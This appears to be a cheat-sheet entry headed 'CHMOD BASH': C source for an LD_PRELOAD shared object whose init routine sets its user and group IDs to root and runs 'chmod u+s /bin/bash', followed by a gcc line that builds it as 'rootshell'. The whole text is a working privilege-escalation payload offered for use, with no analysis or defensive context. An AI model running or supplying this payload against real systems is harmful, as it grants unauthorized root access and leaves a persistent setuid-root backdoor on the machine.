
### CHMOD BASH
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("chmod u+s /bin/bash");
}

gcc -nostartfiles -o rootshell rootshell.c
```

